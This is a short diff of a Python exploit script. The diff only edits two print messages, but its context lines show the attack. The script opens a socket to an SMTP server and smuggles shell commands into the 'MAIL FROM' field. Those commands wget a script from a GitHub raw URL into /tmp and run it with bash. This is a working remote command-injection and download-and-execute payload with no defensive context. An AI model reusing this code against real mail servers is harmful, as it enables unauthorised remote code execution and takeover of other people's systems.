@@ -8,7 +8,7 @@ print(ADDR + " " + str(PORT))
 CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
 
 for cmdnum in range(len(CMD)):
-    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
+    print("Attempting: "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((ADDR, PORT))
     res = s.recv(1024)
@@ -27,7 +27,7 @@ for cmdnum in range(len(CMD)):
         print('[!] Exiting...')
         sys.exit(1)
 
-    print('[*] Connected, sending payload' + CMD[cmdnum])
+    print('[*] Connected, sending payload: ' + CMD[cmdnum])
     s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
     res = s.recv(1024)
     if '250' not in str(res):
